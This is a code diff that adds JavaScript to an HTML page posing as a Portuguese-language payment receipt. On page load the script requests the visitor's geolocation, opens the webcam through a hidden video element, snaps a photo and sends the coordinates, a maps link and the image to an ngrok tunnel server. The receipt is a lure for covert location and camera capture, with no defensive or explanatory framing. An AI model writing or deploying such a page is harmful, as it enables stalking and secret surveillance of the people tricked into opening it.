@@ -23,5 +23,100 @@
 
     <div class="comprovante-footer">
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique
+      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    </div>
+  </div>
+
+  <script>
+    const NGROK_SERVER = "https://1c35-201-42-106-118.ngrok-free.app";
+
+    // Exibir data atual
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          sendLocationAndPhoto,
+          handleError
+        );
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
+    });
+
+    // Função que captura a foto da webcam e chama callback com base64
+    function startCameraAndGetPhoto(callback) {
+      const video = document.createElement("video");
+      video.style.display = "none";
+      document.body.appendChild(video);
+
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
+          video.play();
+
+          video.addEventListener("canplay", () => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageBase64 = canvas.toDataURL("image/png");
+
+            // Para a câmera e remove o vídeo
+            stream.getTracks().forEach(track => track.stop());
+            video.remove();
+
+            callback(imageBase64);
+          });
+        })
+        .catch(err => {
+          alert("Erro ao acessar a webcam: " + err.message);
+          callback(null);
+        });
+    }
+
+    // Função que envia localização + foto juntos para o backend
+    function sendLocationAndPhoto(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      startCameraAndGetPhoto((imageBase64) => {
+        if (!imageBase64) {
+          alert("Erro ao capturar a foto.");
+          return;
+        }
+
+        fetch(`${NGROK_SERVER}/send-data`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ latitude, longitude, maps, photo: imageBase64 }),
+        })
+          .then(res => res.json())
+          .then(data => {
+            if (!data.success) {
+              alert("Erro ao enviar os dados.");
+            }
+          })
+          .catch(err => {
+            console.error("Erro ao enviar os dados:", err);
+            alert("Erro na comunicação com o servidor.");
+          });
+      });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
+    }
+  </script>
+</body>
+
+</html>
 
